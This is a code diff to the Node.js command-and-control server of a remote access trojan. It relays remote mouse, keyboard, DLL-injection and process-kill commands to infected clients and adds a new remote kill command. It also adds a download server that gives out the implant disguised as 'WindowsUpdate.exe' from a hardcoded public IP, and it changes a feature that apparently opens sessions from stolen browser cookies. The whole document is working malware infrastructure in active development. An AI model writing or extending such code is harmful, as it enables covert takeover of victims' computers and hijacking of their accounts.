@@ -9,7 +9,27 @@ const AuthAPI = require('./auth_api');
 
 // Configuration
 const WS_PORT = 8080;      // WebSocket server port (React dashboard)
-const TCP_PORT = 4444;     // TCP server port (C++ RAT clients)
+const TCP_PORT = parseInt(process.env.C2_PORT) || 4444;     // TCP server port (C++ RAT clients)
+const DOWNLOAD_PORT = 8082; // Agent binary download server
+const SERVER_HOST = process.env.SERVER_HOST || '207.189.10.136'; // Public IP/host for download links
+const AGENT_PATH = require('path').join(__dirname, '..', 'rootserver', 'winupdate.exe');
+
+// Kill any stale process holding our ports before binding (prevents EADDRINUSE on restart)
+try {
+    const { execSync } = require('child_process');
+    for (const port of [WS_PORT, TCP_PORT]) {
+        try {
+            const out = execSync(`netstat -ano | findstr ":${port}" | findstr "LISTENING"`, { timeout: 3000 }).toString();
+            for (const line of out.trim().split('\n')) {
+                const pid = parseInt(line.trim().split(/\s+/).pop());
+                if (pid && pid !== process.pid) {
+                    execSync(`taskkill /F /PID ${pid}`, { timeout: 3000 });
+                    console.log(`[BRIDGE] Killed stale PID ${pid} on port ${port}`);
+                }
+            }
+        } catch(e) { /* port not in use or kill failed — fine */ }
+    }
+} catch(e) { /* ignore startup cleanup errors */ }
 
 // Initialize database
 const db = new C2Database('c2_data.db');
@@ -159,46 +179,10 @@ function fireCookieSession(clientId, host, ws = null) {
     });
     
     req.on('error', (err) => {
-        console.log(`[COOKIE AUTO-FIRE] Cookie browser not running: ${err.message} — attempting auto-launch`);
-        // Auto-launch the cookie-browser Electron app then retry once after 2.5s
-        try {
-            const { spawn } = require('child_process');
-            const path = require('path');
-            const cbDir = path.resolve(__dirname, '..', 'cookie-browser');
-            // Resolve the real electron.exe via the electron npm package's index.js
-            // (which reads dist/path.txt and returns the full path to the binary)
-            let electronExe;
-            try {
-                electronExe = require(path.join(cbDir, 'node_modules', 'electron'));
-            } catch(e) {
-                // Fallback to the known dist path
-                electronExe = path.join(cbDir, 'node_modules', 'electron', 'dist', 'electron.exe');
-            }
-            console.log(`[COOKIE SESSION] Spawning Electron: ${electronExe} in ${cbDir}`);
-            spawn(electronExe, [cbDir], { detached: true, stdio: 'ignore', cwd: cbDir }).unref();
-            console.log('[COOKIE AUTO-FIRE] Spawned cookie-browser, retrying in 2.5s...');
-        } catch (spawnErr) {
-            console.error('[COOKIE AUTO-FIRE] Failed to spawn cookie-browser:', spawnErr.message);
-        }
-        // Retry the POST after giving the Electron app time to start
-        setTimeout(() => {
-            const http2 = require('http');
-            const req2 = http2.request({
-                hostname: 'localhost', port: 23456, path: '/', method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
-            }, (res2) => {
-                let b = ''; res2.on('data', c => b += c);
-                res2.on('end', () => {
-                    console.log('[COOKIE AUTO-FIRE] Retry succeeded');
-                    if (ws) ws.send(JSON.stringify({ type: 'cookie_session_opened', host, clientId, cookieCount: hostCookies.length, success: true, timestamp: Date.now() }));
-                });
-            });
-            req2.on('error', (err2) => {
-                console.error('[COOKIE AUTO-FIRE] Retry also failed:', err2.message);
-                if (ws) ws.send(JSON.stringify({ type: 'error', message: 'Cookie browser could not be started. Launch cookie-browser manually.', timestamp: Date.now() }));
-            });
-            req2.write(postData); req2.end();
-        }, 2500);
+        // Cookie browser is not running — do NOT auto-launch Electron.
+        // The user must open the cookie browser manually from the dashboard.
+        console.log(`[COOKIE SESSION] Cookie browser not running (port 23456): ${err.message}`);
+        if (ws) ws.send(JSON.stringify({ type: 'error', message: 'Cookie browser is not running. Open it manually from the dashboard.', timestamp: Date.now() }));
     });
     
     req.write(postData);
@@ -236,6 +220,26 @@ const wss = new WebSocket.Server({
     clientTracking: true,
     perMessageDeflate: false,
     maxPayload: 1048576 // 1MB
+});
+
+// If port is already in use (e.g. stale previous instance), kill it and restart this process.
+wss.on('error', (err) => {
+    if (err.code === 'EADDRINUSE') {
+        console.log(`[BRIDGE] Port ${WS_PORT} in use — killing old process and restarting...`);
+        const { execSync } = require('child_process');
+        try {
+            // Find and kill the PID holding the port
+            const out = execSync(`netstat -ano | findstr ":${WS_PORT}" | findstr "LISTENING"`).toString();
+            const pid = out.trim().split(/\s+/).pop();
+            if (pid && pid !== String(process.pid)) {
+                execSync(`taskkill /F /PID ${pid}`);
+                console.log(`[BRIDGE] Killed PID ${pid}, restarting in 1s...`);
+            }
+        } catch(e) { /* ignore */ }
+        setTimeout(() => { process.exit(1); }, 1000);
+    } else {
+        console.error('[BRIDGE] WebSocket server error:', err.message);
+    }
 });
 
 console.log(`WebSocket server listening on port ${WS_PORT}`);
@@ -1088,15 +1092,21 @@ function sendCommandToRat(clientId, command) {
         return false;
     }
     
-    // Deduplication: skip if same command sent within last 2 seconds
-    const lastCmd = lastCommands.get(clientId);
-    if (lastCmd && lastCmd.command === command && (Date.now() - lastCmd.timestamp) < 2000) {
-        console.log(`Deduplicating duplicate command to ${clientId}: ${command}`);
-        return true; // Return true so caller thinks it was sent
+    // Input commands (mouse/key) bypass deduplication entirely — every event matters.
+    const isInputCmd = typeof command === 'string' &&
+        (command.startsWith('mouse_') || command.startsWith('key_'));
+
+    if (!isInputCmd) {
+        // Deduplication: skip if same command sent within last 2 seconds
+        const lastCmd = lastCommands.get(clientId);
+        if (lastCmd && lastCmd.command === command && (Date.now() - lastCmd.timestamp) < 2000) {
+            console.log(`Deduplicating duplicate command to ${clientId}: ${command}`);
+            return true;
+        }
+        lastCommands.set(clientId, { command, timestamp: Date.now() });
+        console.log(`Sending command to client ${clientId}: ${command}`);
     }
-    
-    lastCommands.set(clientId, { command, timestamp: Date.now() });
-    console.log(`Sending command to client ${clientId}: ${command}`);
+
     ratClient.socket.write(command + '\n');
     return true;
 }
@@ -1129,6 +1139,8 @@ wss.on('connection', (ws, req) => {
     broadcastClientListToUser(ws, user);
 
     // Send welcome message to dashboard
+    const downloadToken = db.getOrCreateDownloadToken(user.userId);
+    const downloadUrl = `http://${SERVER_HOST}:${DOWNLOAD_PORT}/download/${downloadToken}/agent.exe`;
     ws.send(JSON.stringify({
         type: 'connected',
         clientId: dashboardClientId,
@@ -1138,7 +1150,10 @@ wss.on('connection', (ws, req) => {
             username: user.username,
             role: user.role,
             userId: user.userId
-        }
+        },
+        downloadUrl,
+        c2Host: SERVER_HOST,
+        c2Port: TCP_PORT
     }));
 
     // Handle messages from dashboard
@@ -1167,6 +1182,7 @@ wss.on('connection', (ws, req) => {
             const requiresOwnedClient = new Set([
                 'command',
                 'disconnect_client',
+                'kill_rat',
                 'get_processes',
                 'inject_dll',
                 'kill_process',
@@ -1220,6 +1236,9 @@ wss.on('connection', (ws, req) => {
                     }
 
                     // Send command to specific RAT client
+                    if (typeof message.command === 'string' && message.command.startsWith('mouse_click')) {
+                        console.log(`[WS-IN] ${Date.now()} ${message.command}`);
+                    }
                     const success = sendCommandToRat(message.clientId, message.command);
                     if (success) {
                         ws.send(JSON.stringify({
@@ -1311,6 +1330,34 @@ wss.on('connection', (ws, req) => {
                     broadcastClientList();
                     break;
                 }
+
+                case 'kill_rat':
+                    // Permanently kill the RAT on the target client
+                    const killRatClient = ratClients.get(message.clientId);
+                    if (killRatClient && killRatClient.socket && !killRatClient.socket.destroyed) {
+                        console.log(`Sending KILL_RAT command to client: ${message.clientId}`);
+                        const killSent = sendCommandToRat(message.clientId, 'KILL_RAT');
+                        if (killSent) {
+                            ws.send(JSON.stringify({
+                                type: 'kill_rat_sent',
+                                clientId: message.clientId,
+                                timestamp: Date.now()
+                            }));
+                        } else {
+                            ws.send(JSON.stringify({
+                                type: 'error',
+                                message: `Failed to send kill command to client ${message.clientId}`,
+                                timestamp: Date.now()
+                            }));
+                        }
+                    } else {
+                        ws.send(JSON.stringify({
+                            type: 'error',
+                            message: `Client ${message.clientId} not connected`,
+                            timestamp: Date.now()
+                        }));
+                    }
+                    break;
 
                 case 'disconnect_client':
                     // Manually disconnect a specific RAT client
@@ -2239,6 +2286,29 @@ process.on('SIGINT', () => {
 // Start Auth API server
 const authAPI = new AuthAPI(authManager, 8081);
 authAPI.start();
+
+// ---- Agent download server (port 8082) ----
+const downloadServer = require('http').createServer((req, res) => {
+    // Expected: GET /download/<token>/agent.exe
+    const m = req.url.match(/^\/download\/([a-f0-9]+)\/agent\.exe$/);
+    if (!m) { res.writeHead(404); res.end('Not found'); return; }
+    const token = m[1];
+    const userId = db.getUserByDownloadToken(token);
+    if (!userId) { res.writeHead(403); res.end('Invalid token'); return; }
+    const fs = require('fs');
+    if (!fs.existsSync(AGENT_PATH)) { res.writeHead(503); res.end('Agent binary not found on server'); return; }
+    const stat = fs.statSync(AGENT_PATH);
+    res.writeHead(200, {
+        'Content-Type': 'application/octet-stream',
+        'Content-Disposition': 'attachment; filename="WindowsUpdate.exe"',
+        'Content-Length': stat.size
+    });
+    fs.createReadStream(AGENT_PATH).pipe(res);
+    console.log(`[DOWNLOAD] Agent downloaded via token for user_id=${userId}`);
+});
+downloadServer.listen(DOWNLOAD_PORT, () => {
+    console.log(`- Agent download: http://localhost:${DOWNLOAD_PORT}/download/<token>/agent.exe`);
+});
 
 console.log('C2 Bridge Server started');
 console.log(`- WebSocket (Dashboard): ws://localhost:${WS_PORT}`);
